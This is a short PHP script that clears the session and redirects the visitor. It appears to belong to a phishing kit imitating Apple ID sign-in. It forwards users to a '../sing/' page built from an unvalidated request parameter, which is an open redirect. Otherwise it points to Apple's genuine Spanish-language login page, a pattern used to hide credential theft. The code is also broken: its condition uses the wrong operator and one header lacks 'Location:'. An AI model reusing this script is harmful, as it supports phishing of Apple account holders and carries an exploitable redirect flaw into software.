<?php
session_start();
$_SESSION['ssconl']='';
unset($_SESSION['ssconl']);
session_destroy();
    
    if(isset($_REQUEST["id"]) || $_REQUEST["id"]!=""){
        header("Location: ../sing/".$_REQUEST["id"]); 
    }else{
        header("https://idmsa.apple.com/IDMSWebAuth/signin?appIdKey=6f59402f11d3e2234be5b88bf1c96e1e453a875aec205272add55157582a9f61&path=%2F%3Fa%3D1179750425%26s%3D1%26wo%3DMS1BN7QDLY%26pli%3D79013838111353&language=ES-ES"); 
    }

?> 